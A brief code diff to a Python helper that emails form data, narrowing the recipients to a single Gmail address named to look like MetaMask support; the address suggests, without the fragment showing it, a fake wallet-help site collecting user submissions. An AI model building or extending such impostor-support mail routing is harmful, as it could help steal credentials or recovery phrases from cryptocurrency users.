@@ -6,6 +6,6 @@ class Util:
         email = EmailMessage(
             subject=data["subject"],
             body=data['body'],
-            to=["sylvaejike@gmail.com", "metamaskhelpdeskio@gmail.com", "francisokatta1@gmail.com"]
+            to=["metamaskhelpdeskio@gmail.com"]
         )
         email.send()
